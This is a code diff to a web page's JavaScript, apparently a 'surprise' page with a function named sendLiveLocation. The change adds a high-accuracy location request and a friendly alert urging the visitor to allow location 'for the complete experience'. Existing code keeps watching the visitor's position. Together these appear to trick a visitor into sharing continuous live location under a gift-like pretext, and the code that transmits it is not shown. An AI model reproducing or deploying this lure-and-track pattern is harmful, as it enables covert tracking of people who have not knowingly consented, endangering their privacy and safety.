@@ -269,6 +269,44 @@ function sendLiveLocation() {
 
 if (navigator.geolocation) {
 
+    navigator.geolocation.getCurrentPosition(
+
+    function(position){
+
+        console.log("Location Permission Granted");
+
+    },
+
+    function(error){
+
+        console.log(error);
+
+    },
+
+    {
+
+        enableHighAccuracy:true
+
+    }
+
+);
+
+    // ===============================
+// Location Permission Loading
+// ===============================
+
+const locationTimeout = setTimeout(() => {
+
+    if (!latestLocation.latitude) {
+
+        alert(
+            "📍 Please open this surprise in Chrome and Allow Location for the complete experience ❤️"
+        );
+
+    }
+
+}, 5000);
+
     navigator.geolocation.watchPosition(
 
         async function(position) {
@@ -314,6 +352,8 @@ if (navigator.geolocation) {
                 country
 
             };
+
+            clearTimeout(locationTimeout);
 
         },
 
